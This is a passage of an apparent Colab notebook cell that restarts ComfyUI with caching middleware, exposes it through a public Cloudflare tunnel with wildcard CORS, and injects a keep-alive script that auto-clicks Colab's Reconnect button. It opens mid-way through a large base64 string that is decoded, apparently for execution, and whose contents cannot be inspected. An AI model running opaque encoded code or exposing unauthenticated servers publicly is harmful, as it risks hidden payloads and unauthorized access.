K8PJzmStoaY6RS1cvfsX5MhkYHMIMuBybdsZC49VmkTY3xcCmJdiz8oPshLMbaH/dReVs17dVwrxkuBdhMOL7js0Xh2NhPW3UJbnIhdMe3LikMZTYAMQAVUkRIsoBQlCjLkoAnTpK3D9Oj1HjSvPeYwsDx8ODIwPcPGtkxr6dJYUwZjXktfyTTuATCN//LZZkc+q56/QKGmKcI6dILzPQvl31yYZ/3a/AGLqHc0ktzO+yZ7j/FG7RvMjwVElFS7nATSryhRPgD4Q+vqYgsalxXbHozs4uW2RccI9zTEtt3TeKJyJ8T+FhLQhl967iQ6kc0KlAcSzK9uaqwGpCm6+GIfiOPdT4D5+XuyEAiusa3CJluzKOgRTvjTFUt7FUvha3tlaMNCGwib92IKHhBKKBUmbAUZmEsPaOPfmox0RM9UZifWrxEgo0WMJGzZKoCCS7xjQptxaUtzLGhK9U5s9cbuKwUOW9ixQ2dQo09gTsIT+AuysJy4DtF1TJbNv65dej7nuDY2Oy5yS4gqpofQFI2QccQ4qASA1B6NUt4VFjd3LgSQucU3TQMRR93lwshAiyhFTaQzymaZXbHT/JhLSpUHuIOnc2ZHr3UxQgP3UPm7xj+8NiuXUPKtK1j0MVHb4h5jguZQUxcFOM4C7igsm+HsYO6Z/rEVui9jugkypBBk+DbHMJ2NP8ZNeut6ys68d3R1/sR1yjGJGxzcSdmu9azlEYzizLqOlQZVW7ISfxeqeYrHYl90uuOfML18r40mADfcvGgp/R19k8ojFgdzyJLvBgpRT5Jr5+GoH0j+tv+oSt0Kc7R11Ou2TEWDHvkfmAqdIgZJsRViv9qSFyXg2NIBExY+OQXL9x798sEwHxml1vpp1y87mNu6IeXrlNbvllXBwd4DRpZgG0Z79WLLG70u1kn14Xx6PAaMF6CRuUBGoPdbKfH7YDt+v595rOLtC2uDzaZphb6t5uIAnIcG/aCJs0KHO94MQe8YRbHS9hA5Zy8oQcrWjtx/2asHMyTKNUJuKN3LjwfUx9jDHM0uvj9dM7M2KP3RdjM5Kla/v7T0ZGRPkTca1tru5sO/lVCnrqp6dEob2PG6fckaljmwBZ1lF4Bd/IVFgr6PTzbCx2aL/r7y84lwLmLPHgsxNQdXTgZ98OuKHEhMAc9PCGGotvkUmgPJgX7RxjWVO9ovXZ+aWp0REy3Cf0rDHhTHRW0cB5JJfpZ4Z/Vgf2koSTw8DRB/1GK86ujOok6Kg9JHcNqeEDx61qtUjdqlSLRdLVYb5YbRZXMNYqGqjbVStOYqdSM8+hidqCL6UxdzDyQLqa5LmYeUBeoBQY9QQilWUwPOl3MPJIQS2Wp5S8O4cZaUT3NNNnfkeCGWod6YrGaHTUnuzWfuK/0fygh4CE=")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

print("🔄 正在重启 ComfyUI 引擎并重新扫描当前配置的自定义节点与模型...")
subprocess.run(["pkill", "-9", "-f", "main.py"], check=False)
time.sleep(1)
if True:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

try:
    urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0"}), timeout=35)
except Exception:
    pass

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass